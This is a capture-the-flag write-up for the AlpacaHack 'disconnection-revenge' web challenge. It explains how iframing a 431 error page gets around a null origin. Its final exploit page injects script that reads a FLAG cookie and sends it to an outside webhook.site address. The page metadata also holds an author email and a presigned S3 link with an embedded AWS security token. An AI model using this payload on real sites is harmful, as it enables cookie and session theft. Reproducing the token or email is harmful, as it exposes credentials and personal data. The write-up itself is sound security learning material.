---
id: 14e48583-e65d-80e6-b8d5-c53f07905d97
title: >-
  Bypassing null Origin in 4xx Status Code Using Iframe | disconnection-revenge
  Writeup | AlpacaHack Round 7 (Web)
created_time: 2024-11-30T11:42:00.000Z
last_edited_time: 2025-05-22T09:27:00.000Z
cover_image: ./imgs/just-a-chill-guy_3tLjvXZj.jpg
icon_emoji: 😭
categories:
  - XSS
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Bypassing null Origin in 4xx Status Code Using Iframe | disconnection-revenge
  Writeup | AlpacaHack Round 7 (Web)
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/just-a-chill-guy_3tLjvXZj.jpg

---

Unfortunately, I solved this challenge only 30 minutes after the CTF ended. Here is my write-up about the challenge.

![](./imgs/image_DwgIE5Io.png)

![](./imgs/image_OeAvG4ga.png)

# Description

This is a fixed challenge of `disconnection`.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/05b115ea-7d4c-4e24-b39d-6e32117c2161/disconnection-revenge.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB4663QLYEG2L%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T130137Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIFB2EjmvXUY3ZwLIjCIiqAE%2FTeATvbj%2FWuI4Z7sFcdgvAiEAl2njXUnraMiLugYIzJHtcy5t0ccmpR83TiIPMtzmdVwqiAQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDDWfr2%2FNPSJ3SCKKLircAz3Ptw4%2FfikeNRDDn4URo%2Fq%2BQ3N0TOcnBjf0UW47SqSAujmBuqushI78u3Zji7xRWLj31E3Lhdk%2FMrRnS2rb9E67UZwPDY55Aq2iK%2BR1fnGn03i4sXCxe7qIXyLBK73uv9wWyBfodccAYFJFDFXVFfRgri75mYJTVQr%2FbAZBB4XUL%2F4GnXKE%2Bae47w1zNUBv4vxG20lTDcwiVnIcQWdnt4EAwahOyBfGA%2B6ZB59gYZJM4tYMYydqLUW9FPqEk%2BdDcPQpH4FSZtv67zRVzTn0W0KawqiZZj%2B46CNH4j7Dw6DqX11wYQwJ7TL%2F45f3%2FzjoLMa8HNmorOlrqEdLkvFtBDXgR1HEsm10KQvhmtRyNZoITL2EGRwPqkq9S529xvVaQbBynJ8ze5wZhDcmLmmfI3aVV7OOWzgwvQGnDh2fKXOE4kilOB090r8skZenx4fIIsY1LbVFb59cLARDiu7Un%2FX00eidSu2dZ%2BKfFspGPgJbkZZJK9AF%2Fnst6trhy8jsblYaydPKapu1F2xhExgBsipt75p7jd69oMAq70G0%2FWCPXvCWml%2BUtKYyf21RGZXboSqFObrO0NzgPVCyg6LF2rO%2BmyHSllIoWdehz%2BbI5URdfa5h4PYUvSbmkGkLMJHYwcEGOqUBH%2BFDQ5N3KxGsItYOLoJlrbTe5QjJSS7RWVDGqFmCZ83AJ0%2BMHP%2BPnq6GWDa3mYGyYz2PvrhlpbiU%2F6VU9tz7ZFgW%2B6N3HPu9k4XoShFMmo7UG69Mt%2FHYhcKVKlDzeo1KUv%2BYJZ9OhNXYN%2F6kKO2IrEd8Fa1WSGYe7JRQlSbwNWDSZ6bYAYswl2zeQvXntBQqB2Sf6qfVDU7HET6s91dB9PipziWA\&X-Amz-Signature=5eb950131a00bd8fdbe6fcab8340c26456a0ad444402f1c0e140118179077b25\&X-Amz-SignedHeaders=host\&x-id=GetObject)

*   Challenge: [http://34.170.146.252:55944](http://34.170.146.252:55944/), Admin bot: [http://34.170.146.252:56152](http://34.170.146.252:56152/) shared

# Exploit

In this challenge, we are given source code like this:

```javascript
import express from "express";

const html = `
<h1>XSS Playground</h1>
<script>eval(new URLSearchParams(location.search).get("xss"));</script>
`.trim();

express()
  .use("/", (req, res, next) => {
    res.setHeader(
      "Content-Security-Policy",
      "script-src 'unsafe-inline' 'unsafe-eval'; default-src 'none'"
    );
    next();
  })
  .get("/", (req, res) => res.type("html").send(html))
  .all("/*", (req, res) => res.socket.destroy()) // disconnected
  .use((err, req, res, next) => {
    // revenge!
    res.socket.destroy(); // disconnected
  })
  .listen(3000);

```

The interesting part about this source code is in the Content Security Policy (CSP):

```javascript
res.setHeader(
  "Content-Security-Policy",
  "script-src 'unsafe-inline' 'unsafe-eval'; default-src 'none'"
);

```

The disconnect mechanism:

```javascript
.all("/*", (req, res) => res.socket.destroy()) // disconnected
.use((err, req, res, next) => {
  // revenge!
  res.socket.destroy(); // disconnected
})

```

There's also a code injection vulnerability here that allows us to gain XSS:

```javascript
const html = `
<h1>XSS Playground</h1>
<script>eval(new URLSearchParams(location.search).get("xss"));</script>
`.trim();
```

The flag is located in the `/cookie` path, as shown in this snippet of the source code:

```javascript
await page.setCookie({
  name: "FLAG",
  value: FLAG,
  domain: APP_HOST,
  path: "/cookie", // 🍪
});

```

The interesting part is that we can't get the flag easily by accessing `/cookie` directly using XSS and get the cookie from that. The disconnect mechanism causes us to be instantly disconnected when accessing any URL except `/`, resulting in a browser error. Therefore, when we try to access URLs like `/cookie`, the browser will instantly error ERR\_EMPTY\_RESPONSE, and the origin will be null as shown in the image below.

![](./imgs/image_xyiZIUrb.png)

There’s a trick introduced in a previous Google CTF to bypass this issue, as detailed in this [Google CTF solution](https://github.com/google/google-ctf/tree/8ea1054a4a6af49e8cf14e10896dc94d73126a29/2023/quals/web-postviewer2/solution#no-csp-subpage). The trick involves adding an arbitrarily large number of characters into the parameters to make the server return `431 (Request Header Fields Too Large)`. However, simply adding a large number of characters to the parameters won't work, as shown in the image below, where the origin is still null.

![](./imgs/image_oXKFjaHs.png)

The key is to iframe the `431` page, which somehow makes the origin become the original origin instead of null, as shown in the image below.

![](./imgs/image_U9FpYp4t.png)

But… there’s always a problem after problem. The cookie isn’t included in the iframe because the cookie isn’t set to `SameSite=None`, so it’s not included in the iframe in a different origin.

![](./imgs/image_nVR512CH.png)

I just found a strange trick after trying to open a new opener inside the `/cookie` path here:

![](./imgs/image_8Oq9CJYo.png)

When I try to `open("")`, it will have an origin, and the location is `about:blank`. There’s also the flag that should be in the `/cookie` path. I assume that the window we open is somehow in the `/cookie` path, but with the `about:blank` location. I don't know why this happens 💀. But here is my final exploit:

```html
<html>
    <body>
        <iframe></iframe>
        <iframe></iframe>
        <script>
            async function main(){
                const target = "disconnection-revenge"
                const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
                var iframe = document.getElementsByTagName('iframe')[0];
                iframe.src = "http://"+target+":3000/cookie/?"+"A".repeat(100000);
                await sleep(1000);
                var iframe2 = document.getElementsByTagName('iframe')[1];
                iframe2.src = "http://"+target+":3000/?xss="+"w = top.frames[0].open('');setTimeout(()=>{open(`https://webhook.site/37fa4a4c-9842-42db-9431-a15d81aee4a0?${w.document.cookie}`)},1000)";
                await sleep(1000);
            }
            main();
        </script>
    </body>
</html>

```

![](./imgs/image_BQK3W663.png)
